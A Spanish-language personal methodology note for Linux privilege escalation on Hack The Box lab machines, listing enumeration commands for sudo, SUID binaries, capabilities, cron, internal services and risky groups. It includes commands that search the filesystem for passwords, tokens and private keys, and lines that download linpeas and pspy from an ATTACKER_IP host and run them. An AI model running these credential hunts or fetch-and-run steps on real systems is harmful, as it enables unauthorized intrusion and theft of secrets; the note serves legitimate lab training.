---
title: HTB Linux PrivEsc
tags: [htb, methodology, linux, privesc]
created: 2026-04-29
related:
  - "[[HTB/Linux/privilege-escalation|Linux Privilege Escalation]]"
  - "[[HTB/snippets/transfers|Transfers]]"
---

# HTB Linux PrivEsc

> [!abstract] TL;DR
> Orden práctico: `sudo -l`, SUID, capabilities, cron, credenciales, servicios internos, grupos peligrosos, kernel.

## Snapshot

```bash
whoami; id; hostname; pwd
cat /etc/os-release
uname -a
sudo -l
ip -br addr
ip route
ss -tulpen
```

## sudo

```bash
sudo -l
```

Si hay `NOPASSWD`, revisar GTFOBins y path exacto.

## SUID / SGID

```bash
find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f -ls 2>/dev/null
```

Mirar especialmente:

```text
bash, find, vim, cp, tar, zip, python, perl, gdb, env, systemctl
```

## Capabilities

```bash
getcap -r / 2>/dev/null
```

Interesantes:

- `cap_setuid+ep`;
- `cap_dac_read_search+ep`;
- `cap_dac_override+ep`.

## Cron y timers

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

Buscar scripts ejecutados por root y escribibles.

## Credenciales

```bash
grep -RniE 'password|passwd|pwd|secret|token|key' /home /var/www /opt 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find /home /root -name ".*history" -type f 2>/dev/null
```

## Servicios internos

```bash
ss -ltnp
curl -i http://127.0.0.1:PORT
```

Port forward:

```bash
ssh -L 8080:127.0.0.1:PORT user@$IP
```

## Grupos peligrosos

```bash
id
groups
```

Prioridad:

- `docker`;
- `lxd`;
- `disk`;
- `shadow`;
- `adm`;
- `sudo`.

## Herramientas

```bash
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

```bash
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

## Checklist

```text
[ ] sudo -l
[ ] SUID/SGID
[ ] capabilities
[ ] cron/timers
[ ] writable paths
[ ] creds en configs/backups
[ ] servicios internos
[ ] grupos peligrosos
[ ] kernel solo al final
```
